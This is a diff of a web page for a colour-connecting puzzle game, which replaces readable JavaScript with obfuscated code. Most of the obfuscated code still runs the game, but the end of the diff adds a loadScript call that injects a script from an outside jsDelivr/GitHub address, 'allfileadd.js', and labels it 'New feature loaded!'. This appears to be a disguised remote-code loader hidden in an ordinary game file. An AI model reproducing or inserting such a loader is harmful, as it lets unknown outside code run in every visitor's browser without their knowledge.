-                const icon = icons[Math.floor(Math.random() * icons.length)];
-                celebration.innerHTML = `<i class="fas ${icon}"></i>`;
-
-                winMessage.appendChild(celebration);
-            }
-
-            // Create fireworks
-            createFireworks();
-
-            // Show stars with animation
-            stars.forEach((star, index) => {
-                setTimeout(() => {
-                    if (index < starCount) {
-                        star.classList.add('show');
-                    }
-                }, 1000 + index * 300);
-            });
-
-            // Play win sound (simulated with visual feedback)
-            document.body.style.animation = 'pulse 0.5s';
+        return !![];
+    }
+    function _0x208f2a() {
+        const _0x31dfab = _0x65534;
+        _0x799354[_0x31dfab(0x193)] = Date[_0x31dfab(0x1b5)](), _0x799354[_0x31dfab(0x209)] = setInterval(() => {
+            const _0x4cf2bc = _0x31dfab, _0x319275 = Math['floor']((Date['now']() - _0x799354[_0x4cf2bc(0x193)]) / 0x3e8), _0x114783 = Math[_0x4cf2bc(0x1aa)](_0x319275 / 0x3c)['toString']()[_0x4cf2bc(0x1c2)](0x2, '0'), _0x41eb59 = (_0x319275 % 0x3c)[_0x4cf2bc(0x1b0)]()['padStart'](0x2, '0');
+            _0x43ac11[_0x4cf2bc(0x19b)] = _0x114783 + ':' + _0x41eb59;
+        }, 0x3e8);
+    }
+    function _0x340b6c() {
+        const _0x3a148c = _0x65534;
+        _0x799354['timerInterval'] && (clearInterval(_0x799354[_0x3a148c(0x209)]), _0x799354[_0x3a148c(0x209)] = null);
+    }
+    function _0x7265fb() {
+        const _0x333a58 = _0x65534, _0x32e875 = Math[_0x333a58(0x1aa)]((Date['now']() - _0x799354['startTime']) / 0x3e8), _0x1e9c88 = Math[_0x333a58(0x1f1)](0x2 + Math[_0x333a58(0x1aa)](_0x799354[_0x333a58(0x1f9)] / 0x2), _0x799354[_0x333a58(0x1af)][_0x333a58(0x196)]), _0x48a491 = _0x1e9c88 * 0xa;
+        let _0x588353 = 0x3;
+        if (_0x799354[_0x333a58(0x18a)] > _0x48a491 * 1.5)
+            _0x588353 = 0x1;
+        else
+            _0x799354[_0x333a58(0x18a)] > _0x48a491 * 1.2 && (_0x588353 = 0x2);
+        return _0x32e875 > _0x48a491 * 0x5 && (_0x588353 = Math[_0x333a58(0x1ec)](0x1, _0x588353 - 0x1)), _0x588353;
+    }
+    function _0x565618() {
+        for (let _0x2a2b31 = 0x0; _0x2a2b31 < 0x32; _0x2a2b31++) {
             setTimeout(() => {
-                document.body.style.animation = '';
-            }, 500);
+                const _0x283ce3 = _0x43b3, _0x30c4f5 = document[_0x283ce3(0x1d9)](_0x283ce3(0x1c9));
+                _0x30c4f5['className'] = 'firework';
+                const _0x4ba929 = Math[_0x283ce3(0x1b2)]() * 0x64, _0x1316c7 = Math['random']() * 0x64, _0x15074d = [
+                        _0x283ce3(0x20e),
+                        '#4CAF50',
+                        _0x283ce3(0x18d),
+                        _0x283ce3(0x20d),
+                        _0x283ce3(0x1d1),
+                        _0x283ce3(0x1d7),
+                        _0x283ce3(0x198),
+                        _0x283ce3(0x1a7)
+                    ], _0x22755a = _0x15074d[Math['floor'](Math[_0x283ce3(0x1b2)]() * _0x15074d[_0x283ce3(0x196)])];
+                _0x30c4f5['style'][_0x283ce3(0x1a6)] = _0x4ba929 + '%', _0x30c4f5[_0x283ce3(0x199)][_0x283ce3(0x1ee)] = _0x1316c7 + '%', _0x30c4f5[_0x283ce3(0x199)][_0x283ce3(0x1a8)] = _0x22755a;
+                const _0x400b4e = Math['random']() * Math['PI'] * 0x2, _0x329925 = 0x32 + Math[_0x283ce3(0x1b2)]() * 0x64, _0x4a69cf = Math['cos'](_0x400b4e) * _0x329925, _0x5b3f7b = Math[_0x283ce3(0x1f4)](_0x400b4e) * _0x329925;
+                _0x30c4f5[_0x283ce3(0x199)]['setProperty'](_0x283ce3(0x1cd), _0x4a69cf + 'px'), _0x30c4f5[_0x283ce3(0x199)]['setProperty'](_0x283ce3(0x1ef), _0x5b3f7b + 'px'), _0x3f3584[_0x283ce3(0x1a9)](_0x30c4f5), setTimeout(() => {
+                    const _0x4ff7bf = _0x283ce3;
+                    _0x30c4f5[_0x4ff7bf(0x1ea)]();
+                }, 0x3e8);
+            }, _0x2a2b31 * 0x32);
         }
-
-        // Update level indicator
-        function updateLevelIndicator() {
-            levelIndicator.innerHTML = '';
-
-            for (let i = 1; i <= config.maxLevel; i++) {
-                const dot = document.createElement('div');
-                dot.className = 'level-dot';
-
-                if (i === config.currentLevel) {
-                    dot.classList.add('active');
-                } else if (config.completedLevels.includes(i)) {
-                    dot.classList.add('completed');
-                }
-
-                levelIndicator.appendChild(dot);
+    }
+    function _0x553d8f() {
+        const _0x59f26c = _0x65534;
+        _0x340b6c(), _0x799354[_0x59f26c(0x1d0)] = ![];
+        !_0x799354[_0x59f26c(0x1f5)][_0x59f26c(0x1c8)](_0x799354[_0x59f26c(0x1f9)]) && (_0x799354[_0x59f26c(0x1f5)][_0x59f26c(0x208)](_0x799354[_0x59f26c(0x1f9)]), _0x36c129());
+        _0x4e8122[_0x59f26c(0x19b)] = _0x799354[_0x59f26c(0x18a)], _0x36f541[_0x59f26c(0x19b)] = _0x43ac11[_0x59f26c(0x19b)];
+        const _0x47e627 = _0x7265fb();
+        _0x3f3584[_0x59f26c(0x20c)][_0x59f26c(0x1c3)](_0x59f26c(0x1cf));
+        for (let _0x20714f = 0x0; _0x20714f < 0x8; _0x20714f++) {
+            const _0x4284af = document[_0x59f26c(0x1d9)]('div');
+            _0x4284af[_0x59f26c(0x197)] = 'celebration', _0x4284af['style'][_0x59f26c(0x1a6)] = Math[_0x59f26c(0x1b2)]() * 0x64 + '%', _0x4284af[_0x59f26c(0x199)][_0x59f26c(0x1ee)] = Math[_0x59f26c(0x1b2)]() * 0x64 + '%', _0x4284af[_0x59f26c(0x199)][_0x59f26c(0x1cc)] = Math[_0x59f26c(0x1b2)]() * 0x2 + 's';
+            const _0x17c90b = [
+                    'fa-star',
+                    'fa-certificate',
+                    'fa-fire',
+                    _0x59f26c(0x1ab),
+                    'fa-trophy'
+                ], _0x308a01 = _0x17c90b[Math[_0x59f26c(0x1aa)](Math[_0x59f26c(0x1b2)]() * _0x17c90b[_0x59f26c(0x196)])];
+            _0x4284af[_0x59f26c(0x18f)] = '<i\x20class=\x22fas\x20' + _0x308a01 + _0x59f26c(0x1bd), _0x3f3584[_0x59f26c(0x1a9)](_0x4284af);
+        }
+        _0x565618(), _0x5bfd7d[_0x59f26c(0x1c4)]((_0x498645, _0x3834b6) => {
+            setTimeout(() => {
+                const _0x1fd554 = _0x43b3;
+                _0x3834b6 < _0x47e627 && _0x498645[_0x1fd554(0x20c)][_0x1fd554(0x1c3)]('show');
+            }, 0x3e8 + _0x3834b6 * 0x12c);
+        }), document[_0x59f26c(0x1b6)][_0x59f26c(0x199)][_0x59f26c(0x206)] = 'pulse\x200.5s', setTimeout(() => {
+            const _0x413395 = _0x59f26c;
+            document[_0x413395(0x1b6)][_0x413395(0x199)]['animation'] = '';
+        }, 0x1f4);
+    }
+    function _0x668222() {
+        const _0x2f7135 = _0x65534;
+        _0x229905[_0x2f7135(0x18f)] = '';
+        for (let _0x45d1b4 = 0x1; _0x45d1b4 <= _0x799354[_0x2f7135(0x1f3)]; _0x45d1b4++) {
+            const _0xb414bf = document[_0x2f7135(0x1d9)]('div');
+            _0xb414bf[_0x2f7135(0x197)] = _0x2f7135(0x19f);
+            if (_0x45d1b4 === _0x799354['currentLevel'])
+                _0xb414bf['classList']['add'](_0x2f7135(0x1bb));
+            else
+                _0x799354[_0x2f7135(0x1f5)]['includes'](_0x45d1b4) && _0xb414bf[_0x2f7135(0x20c)][_0x2f7135(0x1c3)]('completed');
+            _0x229905[_0x2f7135(0x1a9)](_0xb414bf);
+        }
+    }
+    _0x351ac5[_0x65534(0x195)](_0x65534(0x1c6), () => {
+        _0x12b2cf = [], _0x5c2168 = null, _0x50c248();
+    }), _0x553e4e['addEventListener'](_0x65534(0x1c6), () => {
+        const _0x40fb61 = _0x65534;
+        _0x799354['currentLevel'] = 0x1, _0x799354[_0x40fb61(0x1f5)] = [], _0x12b2cf = [], _0x5c2168 = null, _0x36c129(), _0x50c248();
+    }), _0x3f79ac[_0x65534(0x195)](_0x65534(0x1c6), () => {
+        const _0x532952 = _0x65534;
+        _0x3f3584[_0x532952(0x20c)][_0x532952(0x1ea)](_0x532952(0x1cf));
+        const _0x1dc845 = _0x3f3584[_0x532952(0x1f2)](_0x532952(0x201));
+        _0x1dc845[_0x532952(0x1c4)](_0x5602e6 => _0x5602e6[_0x532952(0x1ea)]()), _0x5bfd7d[_0x532952(0x1c4)](_0x265786 => _0x265786['classList'][_0x532952(0x1ea)](_0x532952(0x1cf))), _0x799354['currentLevel'] < _0x799354['maxLevel'] ? _0x799354[_0x532952(0x1f9)]++ : _0x799354[_0x532952(0x1f9)] = 0x1, _0x12b2cf = [], _0x5c2168 = null, _0x36c129(), _0x50c248();
+    }), _0x36d803[_0x65534(0x195)](_0x65534(0x1c6), () => {
+        const _0x274be4 = _0x65534;
+        if (!_0x799354[_0x274be4(0x1d0)])
+            return;
+        const _0x482e2e = [];
+        for (let _0x55dd7e = 0x0; _0x55dd7e < _0x799354[_0x274be4(0x1bc)]; _0x55dd7e++) {
+            for (let _0x2f28b7 = 0x0; _0x2f28b7 < _0x799354['cols']; _0x2f28b7++) {
+                const _0x523776 = _0x1391e8[_0x55dd7e][_0x2f28b7];
+                _0x523776[_0x274be4(0x1e4)] && !_0x523776[_0x274be4(0x20a)] && !_0x482e2e[_0x274be4(0x1c8)](_0x523776[_0x274be4(0x1ac)]) && _0x482e2e[_0x274be4(0x208)](_0x523776[_0x274be4(0x1ac)]);
             }
         }
-
-        // Event listeners
-        resetBtn.addEventListener('click', () => {
-            completedPaths = [];
-            activePath = null;
-            initGame();
-        });
-
-        newGameBtn.addEventListener('click', () => {
-            config.currentLevel = 1;
-            config.completedLevels = [];
-            completedPaths = [];
-            activePath = null;
-            // حفظ حالة اللعبة عند بدء لعبة جديدة
-            saveGameState();
-            initGame();
-        });
-
-        nextLevelBtn.addEventListener('click', () => {
-            winMessage.classList.remove('show');
-
-            // Clear celebration elements
-            const celebrations = winMessage.querySelectorAll('.celebration, .firework');
-            celebrations.forEach(el => el.remove());
-
-            // Reset stars
-            stars.forEach(star => star.classList.remove('show'));
-
-            // Move to next level
-            if (config.currentLevel < config.maxLevel) {
-                config.currentLevel++;
-            } else {
-                // If all levels completed, go back to level 1
-                config.currentLevel = 1;
-            }
-
-            completedPaths = [];
-            activePath = null;
-            // حفظ حالة اللعبة عند الانتقال للمستوى التالي
-            saveGameState();
-            initGame();
-        });
-
-        hintBtn.addEventListener('click', () => {
-            if (!config.gameActive) return;
-
-            // Find an incomplete color
-            const incompleteColors = [];
-            for (let row = 0; row < config.rows; row++) {
-                for (let col = 0; col < config.cols; col++) {
-                    const cell = grid[row][col];
-                    if (cell.isDot && !cell.path && !incompleteColors.includes(cell.color)) {
-                        incompleteColors.push(cell.color);
-                    }
-                }
-            }
-
-            if (incompleteColors.length > 0) {
-                const hintColor = incompleteColors[Math.floor(Math.random() * incompleteColors.length)];
-
-                // Highlight the color
-                for (let row = 0; row < config.rows; row++) {
-                    for (let col = 0; col < config.cols; col++) {
-                        if (grid[row][col].color === hintColor && grid[row][col].isDot) {
-                            grid[row][col].element.animate(
-                                [
-                                    { transform: 'scale(1)', boxShadow: '0 0 0 rgba(255,255,255,0)' },
-                                    { transform: 'scale(1.2)', boxShadow: '0 0 15px rgba(255,255,255,0.8)' },
-                                    { transform: 'scale(1)', boxShadow: '0 0 0 rgba(255,255,255,0)' }
-                                ],
-                                {
-                                    duration: 1000,
-                                    iterations: 3
-                                }
-                            );
+        if (_0x482e2e[_0x274be4(0x196)] > 0x0) {
+            const _0x104c04 = _0x482e2e[Math[_0x274be4(0x1aa)](Math['random']() * _0x482e2e[_0x274be4(0x196)])];
+            for (let _0x50d683 = 0x0; _0x50d683 < _0x799354[_0x274be4(0x1bc)]; _0x50d683++) {
+                for (let _0x37d379 = 0x0; _0x37d379 < _0x799354[_0x274be4(0x1dd)]; _0x37d379++) {
+                    _0x1391e8[_0x50d683][_0x37d379]['color'] === _0x104c04 && _0x1391e8[_0x50d683][_0x37d379][_0x274be4(0x1e4)] && _0x1391e8[_0x50d683][_0x37d379][_0x274be4(0x1b1)][_0x274be4(0x1ca)]([
+                        {
+                            'transform': _0x274be4(0x1d3),
+                            'boxShadow': _0x274be4(0x191)
+                        },
+                        {
+                            'transform': _0x274be4(0x1da),
+                            'boxShadow': '0\x200\x2015px\x20rgba(255,255,255,0.8)'
+                        },
+                        {
+                            'transform': _0x274be4(0x1d3),
+                            'boxShadow': _0x274be4(0x191)
                         }
-                    }
+                    ], {
+                        'duration': 0x3e8,
+                        'iterations': 0x3
+                    });
                 }
             }
-        });
-
-        // Load saved game state if available
-        const hasSavedState = loadGameState();
-
-        // Start the game
-        initGame();
+        }
     });
+    const _0x202162 = _0x438e29();
+    _0x50c248();
+}));
+function _0x4d59() {
+    const _0x47d12c = [
+        '00:00',
+        'setItem',
+        'isDot',
+        'row',
+        '462grgTAf',
+        'removeChild',
+        'mouseenter',
+        '70%',
+        'remove',
+        'levelIndicator',
+        'max',
+        '#4CAF50',
+        'top',
+        '--ty',
+        '639480rEVdUM',
+        'min',
+        'querySelectorAll',
+        'maxLevel',
+        'sin',
+        'completedLevels',
+        '.star',
+        'touchstart',
+        'getElementById',
+        'currentLevel',
+        '8655234QhdcIN',
+        'height',
+        'contains',
+        'querySelector',
+        'elementFromPoint',
+        'touchmove',
+        'hintBtn',
+        '.celebration,\x20.firework',
+        'DOMContentLoaded',
+        'newGameBtn',
+        'start',
+        '2448OKBqTU',
+        'animation',
+        '100%',
+        'push',
+        'timerInterval',
+        'path',
+        'gameGrid',
+        'classList',
+        '#FFC107',
+        '#FF5252',
+        'moves',
+        'width',
+        'mousedown',
+        '#2196F3',
+        'src',
+        'innerHTML',
+        'cell',
+        '0\x200\x200\x20rgba(255,255,255,0)',
+        'mouseup',
+        'startTime',
+        'script',
+        'addEventListener',
+        'length',
+        'className',
+        '#FF9800',
+        'style',
+        'end',
+        'textContent',
+        'winMessage',
+        'abs',
+        '8lFzLni',
+        'level-dot',
+        'clientY',
+        'log',
+        'level',
+        'dot',
+        'finalMoves',
+        'findIndex',
+        'left',
+        '#E91E63',
+        'backgroundColor',
+        'appendChild',
+        'floor',
+        'fa-gem',
+        'color',
+        '11TvadTF',
+        'timer',
+        'colors',
+        'toString',
+        'element',
+        'random',
+        '6524290gIGglG',
+        'dataset',
+        'now',
+        'body',
+        '40%',
+        'ontouchstart',
+        '50%',
+        'head',
+        'active',
+        'rows',
+        '\x22></i>',
+        'touches',
+        '.path',
+        '1316356mERjLJ',
+        'stringify',
+        'padStart',
+        'add',
+        'forEach',
+        'borderRadius',
+        'click',
+        '74135tDRXzJ',
+        'includes',
+        'div',
+        'animate',
+        'New\x20feature\x20loaded!',
+        'animationDelay',
+        '--tx',
+        'col',
+        'show',
+        'gameActive',
+        '#9C27B0',
+        'finalTime',
+        'scale(1)',
+        'mousemove',
+        'slice',
+        'onload',
+        '#00BCD4',
+        'colorConnectGameState',
+        'createElement',
+        'scale(1.2)',
+        'resetBtn',
+        'preventDefault',
+        'cols',
+        '2463TqaHri',
+        'some',
+        'clientX',
+        '5459319IeNAsC'
+    ];
+    _0x4d59 = function () {
+        return _0x47d12c;
+    };
+    return _0x4d59();
+}
+function loadScript(_0x2c0e71, _0x25a159) {
+    const _0x51b520 = _0xe3fe94, _0x2fa6c5 = document['createElement'](_0x51b520(0x194));
+    _0x2fa6c5[_0x51b520(0x18e)] = _0x2c0e71, _0x2fa6c5[_0x51b520(0x1d6)] = _0x25a159, document[_0x51b520(0x1ba)][_0x51b520(0x1a9)](_0x2fa6c5);
+}
+function _0x43b3(_0x4bbb0d, _0x269501) {
+    const _0x4d59e0 = _0x4d59();
+    return _0x43b3 = function (_0x43b3bd, _0x29643a) {
+        _0x43b3bd = _0x43b3bd - 0x18a;
+        let _0x717da = _0x4d59e0[_0x43b3bd];
+        return _0x717da;
+    }, _0x43b3(_0x4bbb0d, _0x269501);
+}
+loadScript('https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js', function () {
+    const _0x4f8dac = _0xe3fe94;
+    console[_0x4f8dac(0x1a1)](_0x4f8dac(0x1cb));
+});
+
 </script>
 </body>
 </html>
